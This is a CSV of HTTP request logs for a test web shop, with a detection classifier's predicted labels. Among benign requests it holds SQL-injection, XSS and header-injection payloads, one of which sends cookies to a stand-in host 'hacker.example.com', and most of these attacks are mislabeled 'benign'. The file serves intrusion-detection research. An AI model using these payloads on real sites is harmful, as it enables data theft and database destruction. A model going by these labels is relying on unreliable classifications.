row_idx,text,pred_label,max_prob
20329,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20330,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=%3F&nombre=Queso+Manchego&precio=85&cantidad=55&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6972352862358093
20331,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20332,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=55&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6966692805290222
20333,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20334,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombreA=Queso+Manchego&precio=85&cantidad=55&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7110775113105774
20335,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20336,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=faez%7C&pwd=9fi247A&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7919374108314514
20337,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20338,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=faez&pwd=9fi247A&remember=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8037112355232239
20339,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20340,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=faez&pwd=e0carme7tad%2Ca&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7552328705787659
20341,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20342,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=faez&pwd=9fi247A&remember=on&B1A=Entrar PROTOCOL=HTTP/1.1,benign,0.7608093023300171
20343,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20344,METHOD=PUT PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4434623420238495
20345,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=1 PROTOCOL=HTTP/1.1,benign,0.4123231768608093
20346,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
20347,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E PROTOCOL=HTTP/1.1,benign,0.6457715034484863
20348,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
20349,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
20350,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
20351,METHOD=PUT PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.481680691242218
20352,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=2026&B1=Confirmarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727 PROTOCOL=HTTP/1.1,benign,0.6820198893547058
20353,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
20354,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7822766900062561
20355,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
20356,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=2026&B1=Confirmar%2F PROTOCOL=HTTP/1.1,benign,0.6808392405509949
20357,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
20358,METHOD=GET PATH=/tienda1/asf-logo-wide.gif.Inc QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4056781530380249
20359,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=fishkin&password=o4En4.I15&nombre=Santos&apellidos=Velasco+Resuela&email=cordeau%40importardeespa%F1a.nz&dni=28596065G&direccion=Calle+Jupiter%2C+60+13%3FB&ciudad=Santa+Amalia&cp=37891&provincia=Gr%3Fan%2Bad*a&ntc=7011032483255627&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9639228582382202
20360,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20361,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=fishkin&password=o4En4.I15&nombreA=Santos&apellidos=Velasco+Resuela&email=cordeau%40importardeespa%F1a.nz&dni=28596065G&direccion=Calle+Jupiter%2C+60+13%3FB&ciudad=Santa+Amalia&cp=37891&provincia=Guadalajara&ntc=7011032483255627&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9647198915481567
20362,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20363,METHOD=GET PATH=/tienda1/publico/vaciar.jsp/asf-logo-wide.gif/.BAK QUERY= PROTOCOL=HTTP/1.1,benign,0.48136571049690247
20364,METHOD=GET PATH=/tienda1/global.OLD QUERY= PROTOCOL=HTTP/1.1,benign,0.42251816391944885
20365,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mulroney&password=des4718o&nombre=Fares&apellidos=Osa+Matiz&email=lahiri%40martosfutbolsala.mk&dni=96676664M&direccion=Calle+Juan+Correa+De+Vivar+38+1%3FF&ciudad=Cueva+del+Hierro&cp=34127&provincia=Navarra&ntc=291239717167592A&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9771732091903687
20366,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
20367,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mulroney&password=des4718o&nombre=Fares&apellidos=Osa+Matiz&email=lahiri%40martosfutbolsala.mk&dni=96676664M&direccionA=Calle+Juan+Correa+De+Vivar+38+1%3FF&ciudad=Cueva+del+Hierro&cp=34127&provincia=Navarra&ntc=2893190534674100&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9767643809318542
20368,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
20369,METHOD=GET PATH=/servlet/aphtpassword QUERY= PROTOCOL=HTTP/1.1,benign,0.48997533321380615
20370,METHOD=GET PATH=/tienda1/asf-logo-wide QUERY= PROTOCOL=HTTP/1.1,benign,0.4528677463531494
20371,METHOD=GET PATH=/webapp/examples/simple.jsp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.36068102717399597
20372,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=22&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7084341645240784
20373,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20374,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3&nombre=Queso+Manchego&precio=39&cantidad=22&B1A=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7168578505516052
20375,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20376,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=girouard&pwd=Disgu5TAd1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.855743408203125
20377,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20378,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=girouard&pwd=ab1tr%2770ci%F34&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.834513247013092
20379,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20380,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modoA=entrar&login=girouard&pwd=Disgu5TAd1&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8163835406303406
20381,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20382,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 PROTOCOL=HTTP/1.1,benign,0.661132276058197
20383,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
20384,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
20385,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
20386,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
20387,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
20388,METHOD=GET PATH=/iisadmpwd/aexp2.htr QUERY= PROTOCOL=HTTP/1.1,benign,0.4625522494316101
20389,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=4388&B1=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.7094172835350037
20390,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
20391,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=4388&B1=Pasar+por+caja%2F PROTOCOL=HTTP/1.1,benign,0.7092099189758301
20392,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
20393,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=4388&B1A=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.7273886799812317
20394,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748601436615
20395,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=Calle+Cardenal+Gardoqui+62%2C+&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar%27+DELETE+FROM+USERS PROTOCOL=HTTP/1.1,benign,0.9563871026039124
20396,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20397,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9603260159492493
20398,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20399,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=Calle+Cardenal+Gardoqui+62%2C+&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=367411357982441A&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9563871026039124
20400,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20401,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=mellisen&password=ATaCado&nombreA=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=Calle+Cardenal+Gardoqui+62%2C+&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9595046043395996
20402,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20403,METHOD=GET PATH=/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.37098464369773865
20404,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=%3F PROTOCOL=HTTP/1.1,benign,0.4154335856437683
20405,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
20406,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
20407,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
20408,METHOD=GET PATH=/msadc/msadcs.dll QUERY= PROTOCOL=HTTP/1.1,benign,0.3748033046722412
20409,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=zadow&password=alternaci-59&nombre=Gyana&apellidos=%2FBullones+Masnou&email=bushell%40sayuela.uk&dni=23485919K&direccion=C%2F+Juan+Ii%2C+108+12%3FC&ciudad=Inviernas%2C+Las&cp=37428&provincia=Tarragona&ntc=0299500452895556&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9658167362213135
20410,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
20411,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=zadow&passwordA=alternaci-59&nombre=Gyana&apellidos=Farell+Lattuf&email=bushell%40sayuela.uk&dni=23485919K&direccion=C%2F+Juan+Ii%2C+108+12%3FC&ciudad=Inviernas%2C+Las&cp=37428&provincia=Tarragona&ntc=0299500452895556&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.967772901058197
20412,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
20413,METHOD=GET PATH=/IISSamples/sdk/asp/applications/Application_VBScript.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.4178754389286041
20414,METHOD=GET PATH=/6909030637832563290.jsp.inc QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4018782377243042
20415,METHOD=GET PATH=/tienda1/6909030637832563290.jsp.bak QUERY= PROTOCOL=HTTP/1.1,benign,0.479482501745224
20416,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Queso+Manchego&precio=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&cantidad=63&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7641909122467041
20417,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20418,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=63&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7061065435409546
20419,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20420,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombreA=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7082675099372864
20421,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20422,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=whey-min&pwd=r.apaz&remember=on%2F&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7641623020172119
20423,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20424,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=whey-min&pwd=r.apaz&rememberA=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7624924778938293
20425,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20426,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
20427,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
20428,METHOD=GET PATH=/tienda1/publico/carrito.jsp/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.5521746873855591
20429,METHOD=GET PATH=/tienda1/publico.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.3616792857646942
20430,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- PROTOCOL=HTTP/1.1,benign,0.6657449007034302
20431,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
20432,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
20433,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
20434,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar%257C&precio=9823&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7097252011299133
20435,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
20436,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=9823&B1=Confirmar%2F PROTOCOL=HTTP/1.1,benign,0.6863656044006348
20437,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748601436615
20438,METHOD=GET PATH=/6909030637832563290.jsp~ QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3570103943347931
20439,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=subraman&password=rectificadora&nombre=Nehem%EDas&apellidos=%252B&email=law%40ankawaelda.au&dni=13570261P&direccion=o+Riomao+36%2C+8%3FF&ciudad=Villar+de+Peralonso&cp=13429&provincia=M%E1laga&ntc=5016740108170299&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9636916518211365
20440,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20441,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=subraman&password=rectificadora&nombre=Nehem%EDas&apellidos=Rogers&email=law%40ankawaelda.au&dni=541910A8Y&direccion=o+Riomao+36%2C+8%3FF&ciudad=Villar+de+Peralonso&cp=13429&provincia=M%E1laga&ntc=5016740108170299&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9635668992996216
20442,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20443,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=subraman&password=rectificadora&nombre=Nehem%EDas&apellidos=Rogers&email=law%40ankawaelda.au&dni=13570261P&direccion=o+Riomao+36%2C+8%3FF&ciudadA=Villar+de+Peralonso&cp=13429&provincia=M%E1laga&ntc=5016740108170299&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9619666337966919
20444,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
20445,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
20446,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
20447,METHOD=GET PATH=/tienda1/global/menum.jsp/6909030637832563290.jsp.bak QUERY= PROTOCOL=HTTP/1.1,benign,0.5839009881019592
20448,METHOD=GET PATH=/tienda1/6909030637832563290.jsp.old QUERY= PROTOCOL=HTTP/1.1,benign,0.450775682926178
20449,METHOD=GET PATH=/asf-logo-wide.gif/.java QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.39978328347206116
20450,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=doerr&password=8osqu85a7&nombre=Remy&apellidos=Torrado+G%E1llego&email=akadeth_svojtka%40privatebanking.com.pe%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=98300353D&direccion=Calle+Equador+86%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=17001&provincia=Burgos&ntc=9853640605253421&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9699559807777405
20451,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
20452,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=doerr&password=8osqu85a7&nombre=Remy&apellidos=Tauler+Sa-l-inero&email=akadeth_svojtka%40privatebanking.com.pe&dni=98300353D&direccion=Calle+Equador+86%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=17001&provincia=Burgos&ntc=9853640605253421&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9681864976882935
20453,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
20454,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&loginA=doerr&password=8osqu85a7&nombre=Remy&apellidos=Torrado+G%E1llego&email=akadeth_svojtka%40privatebanking.com.pe&dni=98300353D&direccion=Calle+Equador+86%2C+&ciudad=Sant+Cugat+Sesgarrigues&cp=17001&provincia=Burgos&ntc=9853640605253421&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9694314002990723
20455,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
20456,METHOD=GET PATH=/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42968156933784485
20457,METHOD=GET PATH=/6909030637832563290.jsp QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.34937310218811035
20458,METHOD=GET PATH=/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.37098464369773865
20459,METHOD=GET PATH=/tienda1/imagenes/asf-logo-wide.BAK QUERY= PROTOCOL=HTTP/1.1,benign,0.48275455832481384
20460,METHOD=GET PATH=/tienda1/index.jsp.Bak QUERY= PROTOCOL=HTTP/1.1,benign,0.42339587211608887
20461,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=2&nombre=Jam%F3n+Ib%E9rico%27OR%27a%3D%27a&precio=100&cantidad=92&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7161449790000916
20462,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20463,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=2&nombre=Vino+.*%3FRioja&precio=100&cantidad=92&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6756013035774231
20464,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20465,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=92&B1A=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6978259682655334
20466,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
20467,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=adebayo&pwd=pedral&remember=+&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8078380227088928
20468,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20469,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=adebayo&pwd=pedral&remember=off%2F&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8121573328971863
20470,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20471,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=adebayo&pwd=pedral&remember=off&B1A=Entrar PROTOCOL=HTTP/1.1,benign,0.8062158226966858
20472,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
20473,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235 PROTOCOL=HTTP/1.1,benign,0.5762859582901001
20474,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
20475,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
20476,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
20477,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
